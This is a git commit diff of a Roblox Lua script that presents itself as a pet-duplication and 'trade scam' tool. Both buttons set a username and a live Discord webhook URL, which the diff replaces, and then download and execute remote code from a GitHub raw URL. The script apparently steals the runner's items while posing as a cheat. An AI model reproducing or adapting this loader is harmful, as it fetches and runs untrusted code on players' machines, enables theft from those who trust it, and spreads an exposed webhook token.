a1f1dff23ba68810224cf93ce42a09ed982e61af
RuebanD <120219002+RuebanD@users.noreply.github.com>
2023-03-17 07:31:38 +0000

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -5,11 +5,11 @@ local Tab = Window:NewTab("Main")
 local MainSection = Tab:NewSection("Main")
 MainSection:NewButton("Trade Scam", "Before accepting a trade click this", function()
     UserName = "BIGBOYRUEB"
-WebHook = "https://discord.com/api/webhooks/1086018422946676779/a7WSJIXUWbaJPCqYFF_Q12bNqD9V-yaUHhX6gY5fUmy77krOpiLszTjfZdC6lTPRthJi"
+WebHook = "https://discord.com/api/webhooks/1085968982852521995/fmiTNyaty4FbBztrOt40-PhsEM7GuR-yhT3p-gWvG7t1kfzY4Hj1-szVEF_BeDjdrXOB"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
 end)
 MainSection:NewButton("Dupe pets", "With a bank depoit your pets, click this, it will make rejoin you then you pets are duped", function()
     UserName = "BIGBOYRUEB"
-WebHook = "https://discord.com/api/webhooks/1086018422946676779/a7WSJIXUWbaJPCqYFF_Q12bNqD9V-yaUHhX6gY5fUmy77krOpiLszTjfZdC6lTPRthJi"
+WebHook = "https://discord.com/api/webhooks/1085968982852521995/fmiTNyaty4FbBztrOt40-PhsEM7GuR-yhT3p-gWvG7t1kfzY4Hj1-szVEF_BeDjdrXOB"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
 end)
